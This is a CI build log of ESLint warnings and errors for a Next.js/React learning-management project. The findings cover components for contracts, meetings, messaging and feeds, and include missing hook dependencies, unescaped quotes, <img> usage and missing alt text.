2025-11-18T17:35:22.1770980Z ##[warning]  52:6  warning  React Hook useEffect has a missing dependency: 'fetchLessons'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1772529Z 
2025-11-18T17:35:22.1773126Z /home/runner/work/fne-lms/fne-lms/components/assignments/CollaborativeSubmissionModal.tsx
2025-11-18T17:35:22.1775847Z ##[warning]   58:6   warning  React Hook useEffect has a missing dependency: 'loadUserCommunities'. Either include it or remove the dependency array                                                                                                                                          react-hooks/exhaustive-deps
2025-11-18T17:35:22.1780286Z ##[warning]  100:6   warning  React Hook useEffect has a missing dependency: 'loadShareableMembers'. Either include it or remove the dependency array                                                                                                                                         react-hooks/exhaustive-deps
2025-11-18T17:35:22.1785398Z ##[warning]  350:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1789349Z ##[error]  545:34  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.1792234Z ##[error]  545:44  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.1793701Z 
2025-11-18T17:35:22.1794240Z /home/runner/work/fne-lms/fne-lms/components/assignments/CreateGroupModal.tsx
2025-11-18T17:35:22.1797170Z ##[warning]   34:6   warning  React Hook useEffect has a missing dependency: 'loadAvailableMembers'. Either include it or remove the dependency array                                                                                                                                         react-hooks/exhaustive-deps
2025-11-18T17:35:22.1802372Z ##[warning]  191:23  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1804821Z 
2025-11-18T17:35:22.1805449Z /home/runner/work/fne-lms/fne-lms/components/assignments/GroupSubmissionModalV2.tsx
2025-11-18T17:35:22.1808375Z ##[warning]   58:6   warning  React Hook useEffect has a missing dependency: 'loadGroupData'. Either include it or remove the dependency array                                                                                                                                                react-hooks/exhaustive-deps
2025-11-18T17:35:22.1813569Z ##[warning]  667:33  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1816079Z 
2025-11-18T17:35:22.1816646Z /home/runner/work/fne-lms/fne-lms/components/blocks/BibliographyBlockEditor.tsx
2025-11-18T17:35:22.1819510Z ##[warning]  348:19   warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                                                                                                                                                     jsx-a11y/alt-text
2025-11-18T17:35:22.1823609Z ##[warning]  462:17   warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                                                                                                                                                     jsx-a11y/alt-text
2025-11-18T17:35:22.1827596Z ##[warning]  477:23   warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                                                                                                                                                     jsx-a11y/alt-text
2025-11-18T17:35:22.1832748Z ##[warning]  599:35   warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1837387Z ##[warning]  619:39   warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                                                                                                                                                     jsx-a11y/alt-text
2025-11-18T17:35:22.1840579Z ##[error]  783:48   error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.1843429Z ##[error]  783:69   error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.1846246Z ##[error]  817:102  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.1849254Z ##[error]  817:123  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.1850750Z 
2025-11-18T17:35:22.1851301Z /home/runner/work/fne-lms/fne-lms/components/blocks/ExternalLinkBlockEditor.tsx
2025-11-18T17:35:22.1854982Z ##[warning]  374:33  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1857604Z 
2025-11-18T17:35:22.1858157Z /home/runner/work/fne-lms/fne-lms/components/blocks/FileDownloadBlockEditor.tsx
2025-11-18T17:35:22.1860098Z ##[warning]  44:43  warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images  jsx-a11y/alt-text
2025-11-18T17:35:22.1861695Z 
2025-11-18T17:35:22.1862272Z /home/runner/work/fne-lms/fne-lms/components/blocks/GroupAssignmentBlockEditor.tsx
2025-11-18T17:35:22.1863688Z ##[error]  421:55  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1865847Z ##[error]  421:66  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1868415Z ##[error]  433:75  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1870556Z ##[error]  433:89  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1871883Z 
2025-11-18T17:35:22.1872372Z /home/runner/work/fne-lms/fne-lms/components/blocks/ImageBlockEditor.tsx
2025-11-18T17:35:22.1875970Z ##[warning]  211:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1878588Z 
2025-11-18T17:35:22.1878997Z /home/runner/work/fne-lms/fne-lms/components/common/Avatar.tsx
2025-11-18T17:35:22.1881781Z ##[warning]  139:6  warning  React Hook useEffect has a missing dependency: 'imageUrl'. Either include it or remove the dependency array                                                                                                                                                     react-hooks/exhaustive-deps
2025-11-18T17:35:22.1886979Z ##[warning]  179:7  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1889426Z 
2025-11-18T17:35:22.1889991Z /home/runner/work/fne-lms/fne-lms/components/community/WorkspaceSettingsModal.tsx
2025-11-18T17:35:22.1893753Z ##[warning]  170:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1896018Z 
2025-11-18T17:35:22.1896546Z /home/runner/work/fne-lms/fne-lms/components/configuration/UserPreferences.tsx
2025-11-18T17:35:22.1898910Z ##[warning]  110:6    warning  React Hook useEffect has a missing dependency: 'fetchPreferences'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1901575Z ##[error]  537:92   error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                      react/no-unescaped-entities
2025-11-18T17:35:22.1903873Z ##[error]  537:107  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                      react/no-unescaped-entities
2025-11-18T17:35:22.1905215Z 
2025-11-18T17:35:22.1905662Z /home/runner/work/fne-lms/fne-lms/components/contracts/AnnexForm.tsx
2025-11-18T17:35:22.1908069Z ##[warning]   98:6  warning  React Hook useEffect has a missing dependency: 'loadParentContract'. Either include it or remove the dependency array    react-hooks/exhaustive-deps
2025-11-18T17:35:22.1911556Z ##[warning]  157:6  warning  React Hook useEffect has a missing dependency: 'loadClienteContratos'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1913340Z 
2025-11-18T17:35:22.1913828Z /home/runner/work/fne-lms/fne-lms/components/contracts/CashFlowView.tsx
2025-11-18T17:35:22.1916259Z ##[warning]   72:6   warning  React Hook useEffect has a missing dependency: 'loadUFValueAndGenerateCashFlow'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1919449Z ##[error]  711:31  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                    react/no-unescaped-entities
2025-11-18T17:35:22.1922017Z ##[error]  711:41  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                    react/no-unescaped-entities
2025-11-18T17:35:22.1923645Z 
2025-11-18T17:35:22.1924178Z /home/runner/work/fne-lms/fne-lms/components/contracts/ContractDetailsModal.tsx
2025-11-18T17:35:22.1925884Z ##[warning]  130:6  warning  React Hook useEffect has a missing dependency: 'contrato'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1927581Z 
2025-11-18T17:35:22.1928079Z /home/runner/work/fne-lms/fne-lms/components/contracts/ContractForm.tsx
2025-11-18T17:35:22.1930182Z ##[warning]  159:6  warning  React Hook useEffect has a missing dependency: 'fetchSchools'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.1931955Z 
2025-11-18T17:35:22.1932446Z /home/runner/work/fne-lms/fne-lms/components/contracts/ContractPDF.tsx
2025-11-18T17:35:22.1933783Z ##[error]  181:66  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1936247Z ##[error]  181:92  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1938766Z ##[error]  185:46  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1941020Z ##[error]  185:95  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1943267Z ##[error]  406:57  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1945488Z ##[error]  406:98  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1947036Z 
2025-11-18T17:35:22.1947612Z /home/runner/work/fne-lms/fne-lms/components/contracts/ContractPDFComplete.tsx
2025-11-18T17:35:22.1949060Z ##[error]  183:66  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1951367Z ##[error]  183:92  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1953630Z ##[error]  187:46  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1955863Z ##[error]  187:95  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1958316Z ##[error]  578:57  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1960774Z ##[error]  578:98  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1962175Z 
2025-11-18T17:35:22.1962754Z /home/runner/work/fne-lms/fne-lms/components/contracts/ContractPDFImporter.tsx
2025-11-18T17:35:22.1964166Z ##[error]  497:50  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1966427Z ##[error]  497:80  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1968002Z 
2025-11-18T17:35:22.1968521Z /home/runner/work/fne-lms/fne-lms/components/documents/DocumentFilters.tsx
2025-11-18T17:35:22.1970026Z ##[error]  396:25  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1972297Z ##[error]  396:42  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.1973669Z 
2025-11-18T17:35:22.1974165Z /home/runner/work/fne-lms/fne-lms/components/documents/DocumentGrid.tsx
2025-11-18T17:35:22.1976713Z ##[warning]   82:14  warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                                                                                                                                                     jsx-a11y/alt-text
2025-11-18T17:35:22.1982324Z ##[warning]  259:15  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1987316Z ##[error]  528:3   error    React Hook "React.useEffect" is called conditionally. React Hooks must be called in the exact same order in every component render                                                                                                                              react-hooks/rules-of-hooks
2025-11-18T17:35:22.1989334Z 
2025-11-18T17:35:22.1989861Z /home/runner/work/fne-lms/fne-lms/components/documents/DocumentPreview.tsx
2025-11-18T17:35:22.1993837Z ##[warning]  183:13  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.1996381Z 
2025-11-18T17:35:22.1997017Z /home/runner/work/fne-lms/fne-lms/components/feed/CommentThread.tsx
2025-11-18T17:35:22.2000810Z ##[warning]   56:11  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2005818Z ##[warning]  168:6   warning  React Hook useEffect has missing dependencies: 'getCurrentUser' and 'loadComments'. Either include them or remove the dependency array                                                                                                                          react-hooks/exhaustive-deps
2025-11-18T17:35:22.2008124Z 
2025-11-18T17:35:22.2008626Z /home/runner/work/fne-lms/fne-lms/components/feed/CreatePostModal.tsx
2025-11-18T17:35:22.2012308Z ##[warning]  264:17  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2018466Z ##[warning]  295:25  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2021057Z 
2025-11-18T17:35:22.2021527Z /home/runner/work/fne-lms/fne-lms/components/feed/FeedContainer.tsx
2025-11-18T17:35:22.2024212Z ##[warning]   57:6   warning  React Hook useEffect has a missing dependency: 'loadPosts'. Either include it or remove the dependency array                                                                                                                                                    react-hooks/exhaustive-deps
2025-11-18T17:35:22.2029490Z ##[warning]  117:15  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2032010Z 
2025-11-18T17:35:22.2032455Z /home/runner/work/fne-lms/fne-lms/components/feed/MentionList.tsx
2025-11-18T17:35:22.2034421Z ##[error]   14:16  error    Component definition is missing display name                                                                                                                                                                                                                    react/display-name
2025-11-18T17:35:22.2039643Z ##[warning]  100:17  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2042183Z 
2025-11-18T17:35:22.2042608Z /home/runner/work/fne-lms/fne-lms/components/feed/PostCard.tsx
2025-11-18T17:35:22.2045259Z ##[warning]   83:6   warning  React Hook useEffect has a missing dependency: 'supabase.auth'. Either include it or remove the dependency array                                                                                                                                                react-hooks/exhaustive-deps
2025-11-18T17:35:22.2050836Z ##[warning]  166:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2056699Z ##[warning]  259:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2062642Z ##[warning]  297:15  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2065139Z 
2025-11-18T17:35:22.2065779Z /home/runner/work/fne-lms/fne-lms/components/feedback/FeedbackButtonWithPermissions.tsx
2025-11-18T17:35:22.2068630Z ##[warning]  20:6  warning  React Hook useEffect has a missing dependency: 'checkPermission'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2070563Z 
2025-11-18T17:35:22.2071080Z /home/runner/work/fne-lms/fne-lms/components/feedback/FeedbackDetail.tsx
2025-11-18T17:35:22.2074996Z ##[warning]   63:6   warning  React Hook useEffect has missing dependencies: 'loadActivities' and 'onStatusUpdate'. Either include them or remove the dependency array. If 'onStatusUpdate' changes too often, find the parent component that defines it and wrap that definition in useCallback  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2081045Z ##[warning]  267:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element      @next/next/no-img-element
2025-11-18T17:35:22.2086990Z ##[warning]  299:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element      @next/next/no-img-element
2025-11-18T17:35:22.2092826Z ##[warning]  459:11  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element      @next/next/no-img-element
2025-11-18T17:35:22.2095348Z 
2025-11-18T17:35:22.2095842Z /home/runner/work/fne-lms/fne-lms/components/feedback/FeedbackModal.tsx
2025-11-18T17:35:22.2099720Z ##[warning]  292:23  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2102485Z 
2025-11-18T17:35:22.2102915Z /home/runner/work/fne-lms/fne-lms/components/layout/Header.tsx
2025-11-18T17:35:22.2106624Z ##[warning]  38:6   warning  React Hook useEffect has a missing dependency: 'user'. Either include it or remove the dependency array. If 'setLocalUser' needs the current value of 'user', you can also switch to useReducer instead of useState and read 'user' in the reducer              react-hooks/exhaustive-deps
2025-11-18T17:35:22.2112516Z ##[warning]  70:19  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2115097Z 
2025-11-18T17:35:22.2115549Z /home/runner/work/fne-lms/fne-lms/components/layout/MainLayout.tsx
2025-11-18T17:35:22.2118047Z ##[warning]  133:6  warning  React Hook useEffect has a missing dependency: 'sidebarCollapsed'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2119909Z 
2025-11-18T17:35:22.2120341Z /home/runner/work/fne-lms/fne-lms/components/layout/Sidebar.tsx
2025-11-18T17:35:22.2123029Z ##[warning]  416:6   warning  React Hook useEffect has a missing dependency: 'isItemActive'. Either include it or remove the dependency array                                                                                                                                                                react-hooks/exhaustive-deps
2025-11-18T17:35:22.2127473Z ##[error]  579:25  error    React Hook "useCallback" is called conditionally. React Hooks must be called in the exact same order in every component render                                                                                                                                                 react-hooks/rules-of-hooks
2025-11-18T17:35:22.2133005Z ##[warning]  594:8   warning  React Hook useCallback has unnecessary dependencies: 'isCollapsed', 'router', and 'toggleExpanded'. Either exclude them or remove the dependency array. Outer scope values like 'isCollapsed' aren't valid dependencies because mutating them doesn't re-render the component  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2139218Z ##[warning]  794:17  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element                 @next/next/no-img-element
2025-11-18T17:35:22.2145224Z ##[warning]  812:15  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element                 @next/next/no-img-element
2025-11-18T17:35:22.2148017Z 
2025-11-18T17:35:22.2148501Z /home/runner/work/fne-lms/fne-lms/components/meetings/MeetingCard.tsx
2025-11-18T17:35:22.2151715Z ##[warning]   80:6   warning  React Hook useEffect has missing dependencies: 'attachments.length' and 'loadAttachments'. Either include them or remove the dependency array                                                                                                                   react-hooks/exhaustive-deps
2025-11-18T17:35:22.2202621Z ##[warning]  356:25  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2205188Z 
2025-11-18T17:35:22.2205755Z /home/runner/work/fne-lms/fne-lms/components/meetings/MeetingDeletionModal.tsx
2025-11-18T17:35:22.2208557Z ##[warning]   54:6    warning  React Hook useEffect has a missing dependency: 'checkPermissionAndLoadDetails'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2211947Z ##[error]  196:89   error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                   react/no-unescaped-entities
2025-11-18T17:35:22.2214635Z ##[error]  196:104  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                   react/no-unescaped-entities
2025-11-18T17:35:22.2217397Z ##[error]  266:77   error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                   react/no-unescaped-entities
2025-11-18T17:35:22.2219789Z ##[error]  266:94   error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                   react/no-unescaped-entities
2025-11-18T17:35:22.2221256Z 
2025-11-18T17:35:22.2221985Z /home/runner/work/fne-lms/fne-lms/components/meetings/MeetingDetailsModal.tsx
2025-11-18T17:35:22.2224756Z ##[warning]   58:6   warning  React Hook useEffect has a missing dependency: 'loadMeetingDetails'. Either include it or remove the dependency array                                                                                                                                           react-hooks/exhaustive-deps
2025-11-18T17:35:22.2229262Z ##[warning]   64:6   warning  React Hook useEffect has a missing dependency: 'loadAttachments'. Either include it or remove the dependency array                                                                                                                                              react-hooks/exhaustive-deps
2025-11-18T17:35:22.2234381Z ##[warning]  356:31  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2237022Z 
2025-11-18T17:35:22.2237637Z /home/runner/work/fne-lms/fne-lms/components/meetings/MeetingDocumentationModal.tsx
2025-11-18T17:35:22.2240317Z ##[warning]  125:6  warning  React Hook useEffect has missing dependencies: 'loadCommunityMembers' and 'loadMeetingData'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2242306Z 
2025-11-18T17:35:22.2242832Z /home/runner/work/fne-lms/fne-lms/components/messaging/AttachmentPreview.tsx
2025-11-18T17:35:22.2246688Z ##[warning]  191:13  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2249362Z 
2025-11-18T17:35:22.2249863Z /home/runner/work/fne-lms/fne-lms/components/messaging/MentionPicker.tsx
2025-11-18T17:35:22.2251762Z ##[error]  145:24  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.2254671Z ##[error]  145:32  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                                                                                                 react/no-unescaped-entities
2025-11-18T17:35:22.2259550Z ##[warning]  164:17  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2262296Z 
2025-11-18T17:35:22.2262785Z /home/runner/work/fne-lms/fne-lms/components/messaging/MessageCard.tsx
2025-11-18T17:35:22.2265346Z ##[warning]   94:47  warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                                                                                                                                                     jsx-a11y/alt-text
2025-11-18T17:35:22.2270563Z ##[warning]  190:13  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2276430Z ##[warning]  243:25  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2279121Z 
2025-11-18T17:35:22.2279646Z /home/runner/work/fne-lms/fne-lms/components/messaging/MessageComposer.tsx
2025-11-18T17:35:22.2282145Z ##[warning]  158:6   warning  React Hook useCallback has missing dependencies: 'handleSubmit' and 'insertMention'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2285770Z ##[warning]  421:19  warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                              jsx-a11y/alt-text
2025-11-18T17:35:22.2288009Z 
2025-11-18T17:35:22.2288518Z /home/runner/work/fne-lms/fne-lms/components/messaging/MessageFilters.tsx
2025-11-18T17:35:22.2289917Z ##[error]  579:25   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2292177Z ##[error]  579:100  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2293569Z 
2025-11-18T17:35:22.2294200Z /home/runner/work/fne-lms/fne-lms/components/notifications/ModernNotificationCenter.tsx
2025-11-18T17:35:22.2296640Z ##[warning]  200:6  warning  React Hook useEffect has a missing dependency: 'fetchNotifications'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2298628Z 
2025-11-18T17:35:22.2299183Z /home/runner/work/fne-lms/fne-lms/components/notifications/NotificationBell.tsx
2025-11-18T17:35:22.2301445Z ##[warning]  161:6  warning  React Hook useEffect has a missing dependency: 'fetchNotifications'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2303247Z 
2025-11-18T17:35:22.2303780Z /home/runner/work/fne-lms/fne-lms/components/permissions/PermissionGuard.tsx
2025-11-18T17:35:22.2307606Z ##[warning]  41:6  warning  React Hook useEffect has missing dependencies: 'onDenied' and 'router'. Either include them or remove the dependency array. If 'onDenied' changes too often, find the parent component that defines it and wrap that definition in useCallback  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2310062Z 
2025-11-18T17:35:22.2310528Z /home/runner/work/fne-lms/fne-lms/components/quotes/QuoteFormV2.tsx
2025-11-18T17:35:22.2314828Z ##[warning]  100:6  warning  React Hook useEffect has missing dependencies: 'doubleRoomPrice', 'initialData.id', and 'isEditing'. Either include them or remove the dependency array. You can also replace multiple useState variables with useReducer if 'setGroups' needs the current value of 'doubleRoomPrice'  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2317702Z 
2025-11-18T17:35:22.2318214Z /home/runner/work/fne-lms/fne-lms/components/quotes/QuoteGroupsForm.tsx
2025-11-18T17:35:22.2321817Z ##[warning]  57:6  warning  React Hook useEffect has missing dependencies: 'groups' and 'onChange'. Either include them or remove the dependency array. If 'onChange' changes too often, find the parent component that defines it and wrap that definition in useCallback  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2324483Z 
